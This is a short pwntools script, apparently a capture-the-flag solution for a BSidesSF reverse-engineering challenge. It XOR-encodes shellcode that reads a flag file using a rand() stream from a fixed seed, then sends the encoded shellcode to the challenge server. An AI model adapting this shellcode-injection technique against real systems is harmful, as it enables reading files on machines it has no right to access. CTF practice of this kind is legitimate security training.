from pwn import *
from pwnlib.util import fiddling
from ctypes import CDLL
from math import floor

SEED = 0x13371337

context.update(arch='amd64')
libc = CDLL("libc.so.6")
libc.srand(SEED)

sc = asm(shellcraft.cat('/home/ctf/flag.txt'))
enc_sc = ''

for plaintext_byte in sc:
    key = (libc.rand() >> 3) & 0xff
    enc_sc += fiddling.xor(plaintext_byte, key)

p = remote('reverseme2-24b392b5.challenges.bsidessf.net', 1339)
p.sendline(enc_sc)
print(p.recvall())
